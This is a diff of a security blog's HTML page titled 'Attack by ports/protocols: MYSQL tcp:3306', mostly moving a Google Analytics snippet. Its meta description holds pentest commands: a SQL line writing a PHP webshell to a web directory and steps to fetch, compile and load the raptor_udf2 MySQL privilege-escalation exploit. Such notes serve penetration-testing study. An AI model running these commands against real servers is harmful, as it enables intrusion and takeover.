@@ -11,6 +11,17 @@
     <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.fe9a01128f24537e52223a846795c30968baf4cbb17d0f03a14ea859993459ca.css" />
 
     
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SLVHGT13XR"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-SLVHGT13XR', { 'anonymize_ip': false });
+}
+</script>
+
     <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Notes - Attack by ports/protocols: MYSQL tcp:3306"/>
 <meta name="twitter:description" content="tcp/3306 mysql write webshell to filesystem &gt; SELECT &#34;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&#34; INTO OUTFILE &#34;/var/www/https/blogblog/wp-content/uploads/shell.php&#34;; MariaDB MariaDB 10.2, https://github.com/Al1ex/CVE-2021-27928 Prepare the exploit: https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c &gt; wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c&gt; gcc -g -c raptor_udf2.c&gt; gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc&gt; mysql -u root -p Exploit steps mysql&gt; use mysql;mysql&gt; create table foo(line blob);mysql&gt; insert into foo values(load_file(&#39;/tmp/raptor_udf2.so&#39;));# Look for the value of plugin_dir and use the plugin_dir as the dump file locationmysql&gt; show variables like &#39;%plugin%&#39;;mysql&gt; select * from foo into dumpfile &#34;&lt;select-a-path-from-above&gt;/raptor_udf2."/>
@@ -44,15 +55,6 @@
       
   <article class="post">
     <header class="post-header">
-      
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-SLVHGT13XR"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-SLVHGT13XR');
-</script>
       <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8083932952140695"
      crossorigin="anonymous"></script>
       <h1 class ="post-title">Notes - Attack by ports/protocols: MYSQL tcp:3306</h1>
